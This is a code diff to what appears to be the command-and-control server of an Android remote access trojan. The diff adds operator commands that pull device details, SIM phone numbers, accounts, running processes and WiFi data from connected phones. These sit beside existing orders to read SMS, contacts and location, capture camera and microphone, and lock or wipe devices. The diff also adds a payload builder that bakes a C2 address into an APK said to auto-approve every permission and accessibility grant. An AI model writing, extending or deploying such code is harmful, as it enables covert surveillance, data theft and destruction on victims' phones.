@@ -133,6 +133,49 @@ function renderText(name, data) {
     if (data.accuracy != null) out.push(`accuracy: ${data.accuracy}m`);
     return out.join("\n");
   }
+  if (name === "x0000deviceInfo" && typeof data === "object") {
+    const out = lines("Device info");
+    for (const k of ["model", "manufacturer", "brand", "android", "sdk", "serial"]) {
+      if (data[k] != null) out.push(`${k}: ${data[k]}`);
+    }
+    if (data.battery) out.push(`battery: ${data.battery.level}% ${data.battery.charging ? "charging" : ""} ${data.battery.temperature}C`);
+    if (data.memory) out.push(`memory: ${data.memory.availMb}MB free / ${data.memory.totalMb}MB`);
+    if (data.storage) out.push(`storage: ${data.storage.availGb}GB free / ${data.storage.totalGb}GB`);
+    if (data.screen) out.push(`screen: ${data.screen.width}x${data.screen.height} @${data.screen.density}dpi`);
+    if (data.sim) out.push(`sim: state=${data.sim.simState} net=${data.sim.networkOperator} num=${data.sim.phoneNumber || "?"}`);
+    return out.join("\n");
+  }
+  if (name === "x0000battery" && typeof data === "object") {
+    const out = lines("Battery");
+    out.push(`level: ${data.level}%`, `charging: ${data.charging}`, `status: ${data.status}`);
+    if (data.temperature != null) out.push(`temperature: ${data.temperature}C`);
+    return out.join("\n");
+  }
+  if (name === "x0000accounts" && Array.isArray(data.accounts)) {
+    const out = lines("Accounts");
+    for (const a of data.accounts) out.push(`${a.type}: ${a.name}`);
+    out.push(`count: ${data.count}`);
+    return out.join("\n");
+  }
+  if (name === "x0000runningApps" && Array.isArray(data.processes)) {
+    const out = lines("Running processes");
+    for (const p of data.processes) out.push(`${p.processName}  (pid ${p.pid})`);
+    out.push(`count: ${data.count}`);
+    return out.join("\n");
+  }
+  if (name === "x0000wifiInfo" && typeof data === "object") {
+    const out = lines("WiFi");
+    out.push(`enabled: ${data.enabled}`);
+    for (const k of ["ssid", "bssid", "rssi", "linkSpeedMbps", "ip"]) {
+      if (data[k] != null) out.push(`${k}: ${data[k]}`);
+    }
+    return out.join("\n");
+  }
+  if (name === "x0000vibrate" && typeof data === "object") {
+    const out = lines("Vibrate");
+    out.push(`status: ${data.status}`, data.ms != null ? `ms: ${data.ms}` : data.message || "");
+    return out.join("\n");
+  }
   return null;
 }
 
@@ -247,6 +290,8 @@ function startServer(opts) {
       "x0000mc", "x0000fm", "x0000sc", "x0000nt", "x0000getAllImages",
       "x0000getImage", "x0000dm", "x0000openUrl", "x0000runApp",
       "x0000deleteFF", "x0000lockDevice", "x0000wipeDevice", "x0000rebootDevice",
+      "x0000deviceInfo", "x0000battery", "x0000accounts", "x0000runningApps",
+      "x0000wifiInfo", "x0000vibrate",
     ];
     for (const n of names) {
       s.on(n, (data) => {
@@ -567,6 +612,7 @@ function startServer(opts) {
   }
 
   // -- HTTP server ---------------------------------------------------------
+  let building = false;   // one payload build at a time
   const server = http.createServer((req, res) => {
     let u;
     try { u = new URL(req.url, "http://127.0.0.1"); } catch (e) {
@@ -613,6 +659,67 @@ function startServer(opts) {
     }
     if (p === "/api/files") return send(200, JSON.stringify(files()), "application/json");
     if (p === "/api/config-template") return send(200, CONFIG_TEMPLATE, "application/json");
+    if (p === "/api/build" && req.method === "POST") {
+      // Payload builder: POST {url, device_id} -> bakes them into the APK,
+      // runs the gradle build, streams [builder] lines into the live log, and
+      // copies the APK into the downloads dir (listed by /api/files).
+      if (building) {
+        return send(409, JSON.stringify({ error: "a build is already running" }), "application/json");
+      }
+      return readBody(req, (raw) => {
+        let cfg = {};
+        try { cfg = JSON.parse(raw.toString("utf8") || "{}"); } catch (e) {
+          return send(400, JSON.stringify({ error: "bad json" }), "application/json");
+        }
+        // sanitize: only http(s) urls, no quotes/angle brackets/spaces
+        let url = String(cfg.url || "").trim();
+        let deviceId = String(cfg.device_id || "").trim();
+        if (!/^https?:\/\/[^\s"'<>]+$/i.test(url)) {
+          return send(400, JSON.stringify({ error: "url must be http(s)://host[:port]" }), "application/json");
+        }
+        deviceId = deviceId.replace(/[^A-Za-z0-9._-]/g, "").slice(0, 40);
+        try {
+          building = true;
+          const { buildApk } = require("./builder.js");
+          buildApk({ url, device_id: deviceId }, {
+            onLog: (line) => log(line),
+            onDone: (r) => {
+              if (r.ok && r.apk) {
+                // copy the payload into the downloads dir so it shows in the
+                // dashboard Downloads panel + is downloadable via /files/<n>
+                try {
+                  const target = path.join(downloadDir, "payloads", path.basename(r.apk));
+                  fs.mkdirSync(path.dirname(target), { recursive: true });
+                  fs.copyFileSync(r.apk, target);
+                  fs.writeFileSync(target + ".sha256", r.sha256 + "  " + path.basename(r.apk) + "\n");
+                  log(`[*] payload APK ready: ${target} (${r.size} bytes) sha256 ${r.sha256}`);
+                } catch (e) {
+                  log(`[!] payload copy failed: ${e.message}`);
+                }
+              } else {
+                log(`[!] build failed: ${r.error || "unknown"}`);
+              }
+              building = false;
+            },
+          });
+          return send(202, JSON.stringify({ ok: true, message: "build started (see live log)" }), "application/json");
+        } catch (e) {
+          building = false;
+          return send(500, JSON.stringify({ error: String(e.message || e) }), "application/json");
+        }
+      });
+    }
+    if (p === "/api/build-status") {
+      try {
+        const { PAYLOAD_DIR } = require("./builder.js");
+        const apks = fs.existsSync(PAYLOAD_DIR)
+          ? fs.readdirSync(PAYLOAD_DIR).filter((f) => f.endsWith(".apk"))
+          : [];
+        return send(200, JSON.stringify({ builds: apks.map((f) => ({ name: f, path: path.join(PAYLOAD_DIR, f) })) }), "application/json");
+      } catch (e) {
+        return send(500, JSON.stringify({ error: String(e.message || e) }), "application/json");
+      }
+    }
     if (p.startsWith("/files/")) {
       const rel = decodeURIComponent(p.slice("/files/".length)).replace(/\\/g, "/");
       if (rel.startsWith("/") || rel.split("/").includes("..")) return send(400, "invalid path");
@@ -748,6 +855,10 @@ const HELP = `Orders (sent to every connected device; responses are saved as .js
   sms-send <to> <text>             run-app <pkg>   e.g. com.android.settings
   open-url <url>                   delete <path>    delete on device
   call <number>                    lock / wipe / reboot  (device actions!)
+  dinfo         device fingerprint (battery/SIM/storage/memory/screen)
+  battery       battery level/status/charging/temperature
+  accounts      device accounts (GET_ACCOUNTS)      apps-run   running processes
+  wifi          wifi ssid/rssi/speed/ip             buzz [ms]  vibrate device
   raw <json>    send arbitrary order payload
   who / help / quit
 * needs the screen-capture grant given during first app launch.`;
@@ -776,6 +887,12 @@ function parseCommand(line) {
   if (cmd === "lock") return { payload: { order: "x0000lockDevice" } };
   if (cmd === "wipe") return { payload: { order: "x0000wipeDevice" } };
   if (cmd === "reboot") return { payload: { order: "x0000rebootDevice" } };
+  if (cmd === "dinfo") return { payload: { order: "x0000deviceInfo" } };
+  if (cmd === "battery") return { payload: { order: "x0000battery" } };
+  if (cmd === "accounts") return { payload: { order: "x0000accounts" } };
+  if (cmd === "apps-run" || cmd === "running") return { payload: { order: "x0000runningApps" } };
+  if (cmd === "wifi") return { payload: { order: "x0000wifiInfo" } };
+  if (cmd === "buzz") return { payload: { order: "x0000vibrate", ms: parseInt(rest[0] || "500", 10) || 500 } };
   if (cmd === "raw" && rest.length) {
     try { return { payload: JSON.parse(rest.join(" ")) }; } catch (e) { /* fall through */ }
   }
@@ -843,13 +960,19 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
       <div id="files" style="max-height:180px;overflow-y:auto"><p class="dim">waiting&hellip;</p></div>
       <div class="dim" style="font-size:11px;margin-top:6px">every response is saved as <code>.json</code> + readable <code>.txt</code> (contacts / calls / SMS / apps)</div>
     </div>
+    <div class="card" style="margin-top:14px"><h2>Payload builder &mdash; bake C2 config into a new APK</h2>
+      <div class="row"><input type="text" id="burl" value="http://10.0.2.2:42474" placeholder="http://host:42474">
+      <input type="text" id="bdev" placeholder="device id (optional)" style="max-width:150px">
+      <button id="bbuild">Build APK</button></div>
+      <div class="dim" style="font-size:11px;margin-top:6px">runs <code>gradlew assembleDebug -Pc2Url=&hellip; -Pc2DeviceId=&hellip;</code>; the fresh APK auto-approves every permission &amp; activation (accessibility) &mdash; no adb. Progress streams into the live log; APK lands in the Downloads panel.</div>
+    </div>
   </div>
   <div class="card"><h2>Live log</h2><div id="log"></div></div>
 </main>
 <script>
 let target=""; let since=0;
 const $=id=>document.getElementById(id);
-const QUICK=[["apps","apps"],["contacts","cn"],["calls","cl"],["sms","sms"],["cameras","ca"],["location","lm"],["screen","sc"],["photo-back","cam-on 0"],["photo-front","cam-on 1"],["gallery","img-ls"],["mic-live","mic-live"]];
+const QUICK=[["apps","apps"],["contacts","cn"],["calls","cl"],["sms","sms"],["cameras","ca"],["location","lm"],["screen","sc"],["photo-back","cam-on 0"],["photo-front","cam-on 1"],["gallery","img-ls"],["mic-live","mic-live"],["device-info","dinfo"],["battery","battery"],["accounts","accounts"],["running","apps-run"],["wifi","wifi"],["buzz","buzz 300"]];
 function pollDevices(){fetch("/api/devices").then(r=>r.json()).then(d=>{
   $("count").textContent=d.length+" connected";
   $("devs").innerHTML=d.length?"":"<p class='dim'>no devices</p>";
@@ -866,6 +989,10 @@ function renderDevs(){ /* selection highlight is applied during poll */ }
 function esc(s){return s.replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));}
 function order(cmd){fetch("/api/order",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({order:cmd,target})});}
 $("sendraw").onclick=()=>{const v=$("raw").value.trim();if(v){order(v);$("raw").value="";}};
+function buildApk(){const b=$("bbuild");b.disabled=true;b.textContent="Building…";
+  fetch("/api/build",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:$("burl").value.trim(),device_id:$("bdev").value.trim()})})
+  .then(r=>r.json()).then(d=>{if(!d.ok){b.disabled=false;b.textContent="Build APK";alert("build failed: "+(d.error||d.message));}});}
+$("bbuild").onclick=buildApk;
 $("raw").addEventListener("keydown",e=>{if(e.key==="Enter")$("sendraw").click();});
 function pollLog(){fetch("/api/log?since="+since).then(r=>r.json()).then(d=>{
   const L=$("log");const atBottom=L.scrollHeight-L.scrollTop-L.clientHeight<40;
